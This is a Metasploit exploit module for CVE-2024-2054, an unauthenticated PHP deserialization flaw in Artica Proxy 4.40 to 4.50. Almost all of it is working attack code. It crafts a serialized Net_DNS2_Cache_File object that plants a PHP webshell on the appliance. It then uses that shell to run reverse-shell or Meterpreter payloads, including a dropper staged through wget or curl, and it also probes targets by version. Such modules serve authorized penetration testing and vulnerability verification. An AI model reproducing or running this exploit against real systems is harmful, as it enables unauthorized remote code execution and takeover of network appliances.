##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Artica Proxy Unauthenticated PHP Deserialization Vulnerability',
        'Description' => %q{
          A Command Injection vulnerability in Artica Proxy appliance version 4.50 and 4.40
          allows remote attackers to run arbitrary commands via unauthenticated HTTP request.
          The Artica Proxy administrative web application will deserialize arbitrary PHP objects
          supplied by unauthenticated users and subsequently enable code execution as the "www-data" user.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Jaggar Henry of KoreLogic Inc.' # Discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2024-2054'],
          ['URL', 'https://attackerkb.com/topics/q1JUcEJjXZ/cve-2024-2054'],
          ['PACKETSTORM', '177482']
        ],
        'DisclosureDate' => '2024-03-05',
        'Platform' => ['php', 'unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'curl', 'bourne', 'printf', 'echo'],
              'Linemax' => 16384,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 9000
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The Artica Proxy endpoint URL', '/' ]),
      OptString.new('WEBSHELL', [false, 'Set webshell name without extension. Name will be randomly generated if left unset.', nil]),
      OptEnum.new('COMMAND',
                  [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])
    ])
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wizard', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    php_cmd_function = datastore['COMMAND']
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wizard', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        @get_param => php_cmd_function
      },
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : "#{datastore['WEBSHELL']}.php")
    @webshell_full_path = "/usr/share/artica-postfix/wizard/#{@webshell_name}"

    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
    @get_param = Rex::Text.rand_text_alphanumeric(1..8)

    # Upload webshell with PHP payload
    if target['Type'] == :php
      php_payload = "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
    else
      php_payload = "<?=$_GET[\'#{@get_param}\'](base64_decode($_POST[\'#{@post_param}\']));?>"
    end

    php_payload_len = php_payload.length
    webshell_full_path_len = @webshell_full_path.length
    final_payload = "O:19:\"Net_DNS2_Cache_File\":4:{s:10:\"cache_file\";s:#{webshell_full_path_len}:\"#{@webshell_full_path}\";s:16:\"cache_serializer\";s:4:\"json\";s:10:\"cache_size\";i:9999999999;s:10:\"cache_data\";a:1:{s:#{php_payload_len}:\"#{php_payload}\";a:2:{s:10:\"cache_date\";i:0;s:3:\"ttl\";i:9999999999;}}}"
    final_payload_b64 = Base64.strict_encode64(final_payload)

    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wizard', 'wiz.wizard.progress.php'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        'build-js' => final_payload_b64
      }
    })
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path)
    })
    return CheckCode::Unknown('No valid response received from target.') unless res && res.code == 200

    # Check if target is an Artica Proxy appliance
    # Search for the Artica Version tag on the login page
    html = res.get_html_document
    unless html.blank?
      version_match = html.text.match(/Artica.{1,2}\d\.\d\d/)
      return CheckCode::Unknown('No Artica version found.') if version_match.nil?

      version = version_match[0].split(' ')
      if version.count > 1 && Rex::Version.new(version[1]) <= Rex::Version.new('4.50') && Rex::Version.new(version[1]) >= Rex::Version.new('4.40')
        return CheckCode::Vulnerable("Artica version: #{version[1]}")
      else
        return CheckCode::Safe("Artica version: #{version[1]}")
      end
    end
    CheckCode::Unknown
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    res = upload_webshell
    fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 500
    register_file_for_cleanup(@webshell_full_path)

    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
